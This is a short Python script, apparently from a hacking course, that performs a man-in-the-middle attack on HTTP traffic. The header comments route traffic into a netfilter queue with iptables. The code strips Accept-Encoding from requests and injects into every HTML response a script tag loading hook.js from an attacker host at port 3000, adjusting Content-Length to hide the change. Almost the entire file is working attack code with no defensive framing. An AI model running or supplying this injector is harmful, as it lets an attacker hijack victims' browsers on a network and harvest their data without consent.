#!/usr/bin/env python

# before running the main code we need to run some commands like iptables -I OUTPUT -j NFQUEUE --queue-num 0
# and iptables -I INPUT -j NFQUEUE --queue-num 0
# to start our own web server the command is service apache2 start

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load=scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+]Reqeust")
                load=re.sub("Accept-Encoding:.*?\\r\\n", "",load)

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                # print(scapy_packet.show())
                injection_code='<script src="http://192.168.17.151:3000/hook.js"></script>'
                load=load.replace('</body>',injection_code + "</body>")
                content_length_search=re.search("(?:Content-Length:\s)(\d*)",load)
                if content_length_search and "text/html" in load:
                    content_length=content_length_search.group(1)
                    new_content_length=int(content_length) + len(injection_code)
                    load=load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
